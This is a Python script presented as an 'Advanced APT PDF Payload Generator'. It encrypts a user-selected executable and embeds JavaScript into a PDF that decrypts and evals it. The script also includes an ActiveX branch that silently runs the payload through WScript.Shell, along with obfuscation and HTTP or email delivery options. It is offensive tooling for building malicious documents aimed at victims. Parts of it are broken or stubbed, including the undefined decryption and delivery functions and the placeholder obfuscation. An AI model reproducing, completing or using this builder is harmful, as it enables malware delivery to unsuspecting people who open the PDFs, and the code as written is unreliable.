import os
import random
import string
import base64
import logging
from PyPDF2 import PdfReader, PdfWriter
from reportlab.pdfgen import canvas
from reportlab.lib.pagesizes import letter
from tkinter import Tk
from tkinter.filedialog import askopenfilename
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from rich.console import Console
from rich.prompt import Prompt
from rich.panel import Panel

# Initialize Console
console = Console()

# Set up logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def clear_console():
    """Clear the console for a clean output."""
    os.system('cls' if os.name == 'nt' else 'clear')

def display_banner():
    """Display the banner for the PDF generator."""
    console.print(Panel("Advanced APT PDF Payload Generator v2.0", title="Welcome", title_align="left", border_style="bold magenta"))

def generate_random_filename(extension=".pdf"):
    """Generate a random filename for the output PDF."""
    return ''.join(random.choices(string.ascii_letters + string.digits, k=12)) + extension

def generate_key():
    """Generate a symmetric AES key."""
    return os.urandom(32)

def aes_encrypt(data, key):
    """Encrypt data using AES with CBC mode."""
    iv = os.urandom(16)
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    padder = padding.PKCS7(algorithms.AES.block_size).padder()
    padded_data = padder.update(data) + padder.finalize()
    return iv + encryptor.update(padded_data) + encryptor.finalize()

def generate_js_payload(encrypted_payload, symmetric_key, use_active_x, delivery_method):
    """Generate JavaScript payload to be embedded in PDF."""
    js_payload = f"""
        var payload = "{base64.urlsafe_b64encode(encrypted_payload).decode()}";
        var key = "{base64.urlsafe_b64encode(symmetric_key).decode()}";

        function decryptAndExecute(encrypted) {{
            var iv = encrypted.slice(0, 16);
            var encryptedData = encrypted.slice(16);
            // AES decryption logic here
            var decrypted = aesDecrypt(encryptedData, key, iv);
            eval(decrypted); // Execute the decrypted payload
        }}

        {active_x_payload() if use_active_x else "decryptAndExecute(payload);"}
    """
    
    # Delivery method logic
    if delivery_method == "http":
        js_payload += """
            // Logic for downloading the payload from a server
            downloadPayload(payload);
        """
    elif delivery_method == "email":
        js_payload += """
            // Logic for sending the payload via email
            sendEmail(payload);
        """
    
    return js_payload

def active_x_payload():
    """Generate ActiveX payload JavaScript."""
    return """
        if (typeof ActiveXObject != "undefined") {
            try {
                var shell = new ActiveXObject("WScript.Shell");
                shell.Run("cmd.exe /c your_payload.exe", 0, true); // Execute the payload
            } catch (e) {
                console.log("ActiveX error: " + e.message);
            }
        } else {
            console.log("ActiveX is not supported.");
        }
    """

def embed_payload_in_pdf(output_pdf_path, payload, symmetric_key, use_active_x, delivery_method):
    """Embed encrypted payload in PDF and add JavaScript for execution."""
    writer = PdfWriter()

    # Check if the user wants to use an existing PDF
    if os.path.exists(output_pdf_path):
        existing_pdf = PdfReader(output_pdf_path)
        for page in existing_pdf.pages:
            writer.add_page(page)

    # Generate the JavaScript payload
    js_payload = generate_js_payload(payload, symmetric_key, use_active_x, delivery_method)
    writer.add_js(js_payload)
    
    # Write the modified PDF to file
    with open(output_pdf_path, "wb") as f:
        writer.write(f)
    logging.info(f"Advanced PDF payload created at {output_pdf_path}")

def select_file():
    """Prompt user to select a binary file."""
    Tk().withdraw()
    return askopenfilename(filetypes=[("Executable files", "*.exe"), ("Binary files", "*.bin"), ("All files", "*.*")])

def read_binary_file(file_path):
    """Read binary content from the specified file."""
    with open(file_path, 'rb') as f:
        return f.read()

def select_existing_pdf():
    """Prompt user to select an existing PDF file."""
    Tk().withdraw()
    return askopenfilename(filetypes=[("PDF files", "*.pdf"), ("All files", "*.*")])

def select_encryption_method():
    """Prompt user to select an encryption method."""
    console.print("[bold cyan]Select Encryption Method:[/bold cyan]")
    return Prompt.ask("[yellow]Enter choice (1: AES 256, 2: AES 128, 3: No Encryption, 4: XOR)[/yellow]", choices=["1", "2", "3", "4"])

def select_js_obfuscation():
    """Prompt user to select JS obfuscation method."""
    console.print("[bold cyan]Select JavaScript Obfuscation:[/bold cyan]")
    return Prompt.ask("[yellow]Enter choice (1: Basic, 2: Advanced, 3: None, 4: Custom)[/yellow]", choices=["1", "2", "3", "4"])

def select_active_x_option():
    """Prompt user to select whether to use ActiveX."""
    console.print("[bold cyan]Use ActiveX payload? (Recommended for Windows):[/bold cyan]")
    return Prompt.ask("[yellow]Enter choice (1: Yes, 2: No, 3: Prompt, 4: Fallback)[/yellow]", choices=["1", "2", "3", "4"])

def select_delivery_method():
    """Prompt user to select a delivery method for the payload."""
    console.print("[bold cyan]Select Delivery Method:[/bold cyan]")
    return Prompt.ask("[yellow]Enter choice (1: Local, 2: HTTP, 3: Email, 4: P2P)[/yellow]", choices=["1", "2", "3", "4"])

def main():
    clear_console()
    display_banner()

    # Option to select existing PDF or create a new one
    console.print("[bold cyan]Do you want to use an existing PDF or create a new one?[/bold cyan]")
    pdf_choice = Prompt.ask("[yellow]Enter choice (1: Existing PDF, 2: New PDF)[/yellow]", choices=["1", "2"])

    if pdf_choice == "1":
        output_pdf_path = select_existing_pdf()
        if not output_pdf_path:
            console.print("[red]No PDF selected, exiting.[/red]")
            return
    else:
        output_pdf_path = generate_random_filename()

    console.print("[bold cyan]Select binary file to embed in PDF[/bold cyan]")
    file_path = select_file()
    if not file_path:
        console.print("[red]No file selected, exiting.[/red]")
        return

    try:
        # Read the selected binary file
        payload = read_binary_file(file_path)

        # Select encryption method
        encryption_choice = select_encryption_method()
        if encryption_choice == "1":
            symmetric_key = generate_key()
            encrypted_payload = aes_encrypt(payload, symmetric_key)
        elif encryption_choice == "2":
            symmetric_key = os.urandom(16)  # AES 128-bit key
            encrypted_payload = aes_encrypt(payload, symmetric_key)
        elif encryption_choice == "3":
            encrypted_payload = payload
            symmetric_key = None  # No encryption
        elif encryption_choice == "4":
            # Implement XOR encryption
            symmetric_key = os.urandom(8)  # Example key for XOR
            encrypted_payload = bytearray([b ^ symmetric_key[i % len(symmetric_key)] for i, b in enumerate(payload)])

        # Select JavaScript obfuscation method
        js_obfuscation_choice = select_js_obfuscation()
        # Implement obfuscation logic based on user choice
        if js_obfuscation_choice == "1":
            payload = base64.b64encode(payload).decode()  # Basic encoding
        elif js_obfuscation_choice == "2":
            # Placeholder for advanced obfuscation using a library
            pass
        elif js_obfuscation_choice == "4":
            # Custom obfuscation logic
            pass

        # Select ActiveX option
        use_active_x = select_active_x_option()
        use_active_x = use_active_x in ["1", "3"]  # Convert to boolean based on user choice

        # Select delivery method
        delivery_method = select_delivery_method()

        # Embed the payload into the PDF
        embed_payload_in_pdf(output_pdf_path, encrypted_payload, symmetric_key, use_active_x, delivery_method)

        console.print("[green]Operation completed successfully. PDF is ready for delivery.[/green]")

    except Exception as e:
        logging.error(f"An error occurred: {e}")

if __name__ == "__main__":
    main()

